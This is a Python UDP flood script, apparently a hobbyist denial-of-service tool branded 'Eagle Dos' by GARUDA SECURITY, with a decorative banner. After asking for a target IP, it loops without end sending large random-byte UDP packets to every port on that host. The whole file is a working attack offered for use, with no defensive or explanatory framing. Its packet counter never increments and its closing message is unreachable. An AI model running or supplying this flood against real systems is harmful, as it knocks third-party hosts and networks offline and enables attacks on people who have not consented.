import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print(" ")
print("                              $$\                       $ \                     ")
print("                              $$ |                      $$ |                    ")
print(" $$$$$$\   $$$$$$\   $$$$$$\  $$ | $$$$$$\         $$$$$$$ | $$$$$$\   $$$$$$$\ ")
print("$$  __$$\  \____$$\ $$  __$$\ $$ |$$  __$$\       $$  __$$ |$$  __$$\ $$  _____|")
print("$$$$$$$$ | $$$$$$$ |$$ /  $$ |$$ |$$$$$$$$ |      $$ /  $$ |$$ /  $$ |\$$$$$$\  ")
print("$$   ____|$$  __$$ |$$ |  $$ |$$ |$$   ____|      $$ |  $$ |$$ |  $$ | \____$$\ ")
print("\$$$$$$$\ \$$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\       \$$$$$$$ |\$$$$$$  |$$$$$$$  |")
print(" \_______| \_______| \____$$ |\__| \_______|       \_______| \______/ \_______/ ")
print("                    $$\   $$ |                                                  ")
print("                    \$$$$$$  |                                                  ")
print("                     \______/                                                   ")
print()
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : GARSEC" + N + "   Eagle Dos From - " + B + "" + R + "WH1T3" + N)
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : GARUDA SECURITY\033[0m")
print("\033[33mGithub 	       : https://github.com/FAHX7NON/\033[0m")
print("\033[33mTelegram       : https://t.me/OFCTEAMGRD\033[0m")
print("\033[32m================================================================\033[0m")
print('THANKS TELAH MENGGUNAKAN')

ip = input("[+] Target's IP : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))

        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")